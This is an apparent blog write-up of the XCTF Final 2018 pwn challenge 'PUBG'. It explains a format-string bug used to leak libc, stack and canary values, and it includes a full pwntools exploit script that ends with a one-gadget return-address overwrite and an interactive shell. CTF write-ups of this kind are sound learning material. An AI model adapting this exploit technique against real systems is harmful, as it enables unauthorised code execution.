---
title: 'XCTF-final-2018:PUBG'
date: 2018-11-08 11:42:26
tags:
layout: default
---
Interesting game
<!--more-->
# File
[PUBG][1]
# PUBG
* PICK A GUN first
* AND you have two choise : gang or gou
* gou :
    you may find AWM
* gang :
    if you dont have AWM you will die
* IF you win you can leak something and you can overflow to control the RIP
* so enjoy the game
# Entry point
*  you can leak libc by 
```python
  for ( j = 0; j <= 3; ++j )
  {
    if ( s[j] != buf[j] )
    {
      printf(s);#formatstr
      puts(" has no airdrop");
      return __readfsqword(0x28u) ^ v4;
    }
  }
```
* Luckily you can leak j .so you can burp the position of airdrop
* so you will get the AWM
* and use the only chance to leak  canary
* so go to control EIP

# EXP
```python
from pwn import *
def cmd(c):
	p.readuntil("> ")
	p.sendline(str(c))
def airdrop(c):
	cmd(2)
	p.readuntil("position:")
	p.send(c)

#context.log_level="debug"
p=process("./pubg")
p=remote("127.0.0.1",1025)
cmd(1)
cmd(1)
airdrop("%p%p%p%p\n")
p.readuntil("0x25")
base=int(p.readline(),16)-0x5cd700+0x7fd980588000-0x7fd98058d000
log.warning("Libc:%s",hex(base))
airdrop("%a%a%a%a%a")
p.readuntil("ap-10220x0.0")
stack=int("0x"+p.read(11)+"0",16)
log.info("stack:%s",hex(stack))


res=""
for x in range(3):
	for y in range(1,256):
		if (chr(y)!='n' and chr(y)!='$' and chr(y)!='*' and chr(y)!='|'):

			airdrop(res+"{}%p|%p\n".format(chr(y).ljust(3-x,'\x01')))
			p.readuntil("|")
			data=p.readline()
			if data=="(nil)\n":
				data=0
			else :
				data=int(data,16)
			if (data==x+1):
				res+=chr(y)
				break
			else:
				continue
airdrop(res)
cmd(1)
p.readuntil("chicken:\n")
canary_add=(0x7ffe2c5822c8-0x7ffe2c5823d0)+stack

p.sendline(str(canary_add+1))
sleep(0.1)
p.readuntil("The ")
data="\x00"+p.read(7)
canary=u64(data.ljust(8,'\x00'))
log.info("Cnary:%s",hex(canary))
p.readuntil("~\n")
off=0x20
one=base+0x45216
p.send("\x00"*off+p64(canary)*3+p64(one)+"\n")
p.interactive()
```

# review 
Is a interesting game
There are lots of little trick in this challenge.


[1]:https://github.com/n132/Watermalon/tree/master/XCTF_FINAL_2018/pubg